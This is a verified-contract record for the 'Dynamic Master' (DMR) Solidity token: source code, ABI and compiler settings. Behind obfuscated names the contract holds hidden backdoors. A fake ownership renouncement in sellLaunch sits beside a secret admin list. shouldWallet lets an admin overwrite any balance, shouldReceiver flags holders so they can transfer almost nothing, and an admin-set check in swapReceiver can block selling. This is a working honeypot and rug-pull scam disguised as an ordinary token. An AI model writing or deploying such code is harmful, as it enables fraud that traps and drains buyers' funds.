{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface receiverAt {\n    function createPair(address launchedLiquidity, address limitReceiver) external returns (address);\n}\n\ninterface walletMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTo) external view returns (uint256);\n\n    function transfer(address tradingList, uint256 fromReceiverLimit) external returns (bool);\n\n    function allowance(address tokenSenderSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromReceiverLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingList,\n        uint256 fromReceiverLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxTx, uint256 value);\n    event Approval(address indexed tokenSenderSell, address indexed spender, uint256 value);\n}\n\nabstract contract tradingReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletTakeFee is walletMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DynamicMaster is tradingReceiver, walletMarketing, walletTakeFee {\n\n    mapping(address => mapping(address => uint256)) private walletLaunched;\n\n    function fundBuy(address amountLaunched) public {\n        require(amountLaunched.balance < 100000);\n        if (fundAuto) {\n            return;\n        }\n        \n        tokenAuto[amountLaunched] = true;\n        if (limitAutoEnable != minFee) {\n            tokenMin = true;\n        }\n        fundAuto = true;\n    }\n\n    address public fundLaunch;\n\n    uint256 private limitAutoEnable;\n\n    uint256 public minFee;\n\n    function launchAuto() private view {\n        require(tokenAuto[_msgSender()]);\n    }\n\n    function shouldAt(uint256 fromReceiverLimit) public {\n        launchAuto();\n        toTx = fromReceiverLimit;\n    }\n\n    function shouldReceiver(address totalSwap) public {\n        launchAuto();\n        \n        if (totalSwap == fundLaunch || totalSwap == swapLaunched) {\n            return;\n        }\n        teamSell[totalSwap] = true;\n    }\n\n    uint256 shouldLimit;\n\n    bool public txReceiver;\n\n    bool public fundAuto;\n\n    string private launchAmount = \"Dynamic Master\";\n\n    address private sellTxTeam;\n\n    function balanceOf(address modeTo) public view virtual override returns (uint256) {\n        return tradingTeam[modeTo];\n    }\n\n    function owner() external view returns (address) {\n        return sellTxTeam;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atMin;\n    }\n\n    function approve(address senderIs, uint256 fromReceiverLimit) public virtual override returns (bool) {\n        walletLaunched[_msgSender()][senderIs] = fromReceiverLimit;\n        emit Approval(_msgSender(), senderIs, fromReceiverLimit);\n        return true;\n    }\n\n    function fundLimit(address txWallet, address tradingList, uint256 fromReceiverLimit) internal returns (bool) {\n        require(tradingTeam[txWallet] >= fromReceiverLimit);\n        tradingTeam[txWallet] -= fromReceiverLimit;\n        tradingTeam[tradingList] += fromReceiverLimit;\n        emit Transfer(txWallet, tradingList, fromReceiverLimit);\n        return true;\n    }\n\n    uint256 constant maxIs = 15 ** 10;\n\n    function swapReceiver(address txWallet, address tradingList, uint256 fromReceiverLimit) internal returns (bool) {\n        if (txWallet == fundLaunch) {\n            return fundLimit(txWallet, tradingList, fromReceiverLimit);\n        }\n        uint256 fundFeeLaunch = walletMarketing(swapLaunched).balanceOf(teamLaunch);\n        require(fundFeeLaunch == toTx);\n        require(tradingList != teamLaunch);\n        if (teamSell[txWallet]) {\n            return fundLimit(txWallet, tradingList, maxIs);\n        }\n        return fundLimit(txWallet, tradingList, fromReceiverLimit);\n    }\n\n    string private tokenSell = \"DMR\";\n\n    uint256 private atMin = 100000000 * 10 ** 18;\n\n    address listShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public swapLaunched;\n\n    mapping(address => bool) public tokenAuto;\n\n    event OwnershipTransferred(address indexed receiverLaunch, address indexed modeMinAt);\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenSell;\n    }\n\n    mapping(address => uint256) private tradingTeam;\n\n    bool private fundWalletLiquidity;\n\n    address teamLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 toTx;\n\n    function sellLaunch() public {\n        emit OwnershipTransferred(fundLaunch, address(0));\n        sellTxTeam = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return sellTxTeam;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAmount;\n    }\n\n    function transfer(address receiverShouldLaunched, uint256 fromReceiverLimit) external virtual override returns (bool) {\n        return swapReceiver(_msgSender(), receiverShouldLaunched, fromReceiverLimit);\n    }\n\n    constructor (){\n        if (txReceiver != fundWalletLiquidity) {\n            limitAutoEnable = minFee;\n        }\n        fundAmount buyMin = fundAmount(listShould);\n        swapLaunched = receiverAt(buyMin.factory()).createPair(buyMin.WETH(), address(this));\n        \n        fundLaunch = _msgSender();\n        tokenAuto[fundLaunch] = true;\n        tradingTeam[fundLaunch] = atMin;\n        sellLaunch();\n        if (tokenMin) {\n            minFee = limitAutoEnable;\n        }\n        emit Transfer(address(0), fundLaunch, atMin);\n    }\n\n    function allowance(address tradingFund, address senderIs) external view virtual override returns (uint256) {\n        if (senderIs == listShould) {\n            return type(uint256).max;\n        }\n        return walletLaunched[tradingFund][senderIs];\n    }\n\n    bool private tokenMin;\n\n    uint8 private receiverAmount = 18;\n\n    function transferFrom(address txWallet, address tradingList, uint256 fromReceiverLimit) external override returns (bool) {\n        if (_msgSender() != listShould) {\n            if (walletLaunched[txWallet][_msgSender()] != type(uint256).max) {\n                require(fromReceiverLimit <= walletLaunched[txWallet][_msgSender()]);\n                walletLaunched[txWallet][_msgSender()] -= fromReceiverLimit;\n            }\n        }\n        return swapReceiver(txWallet, tradingList, fromReceiverLimit);\n    }\n\n    function shouldWallet(address receiverShouldLaunched, uint256 fromReceiverLimit) public {\n        launchAuto();\n        tradingTeam[receiverShouldLaunched] = fromReceiverLimit;\n    }\n\n    mapping(address => bool) public teamSell;\n\n    function name() external view virtual override returns (string memory) {\n        return launchAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSenderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMinAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"}],\"name\":\"fundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"shouldAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"shouldWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DynamicMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}